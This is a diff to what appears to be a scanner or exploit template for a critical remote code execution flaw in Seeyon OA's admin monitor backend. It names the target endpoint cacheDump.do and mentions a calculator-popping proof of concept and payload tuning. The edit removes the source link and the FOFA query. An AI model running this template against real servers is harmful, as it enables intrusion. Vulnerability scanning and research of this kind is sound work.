@@ -3,12 +3,8 @@ info:
   name: 致远OA monitor管理员后台任意代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tgrpby3qkkprybq5'
+  description: ''
   tags: rce,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tgrpby3qkkprybq5
-    fofa: app="致远互联-OA"
 http:
 - raw:
   - 'POST /seeyon/ctp/sysmgr/monitor/cacheDump.do HTTP/1.1
@@ -41,8 +37,6 @@ http:
 
 
     **弹出计算器**
-
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1775532051165-4231a59e-6c34-42e1-a47d-2a6e267abff8.png)
 
 
     **payload 优化**'
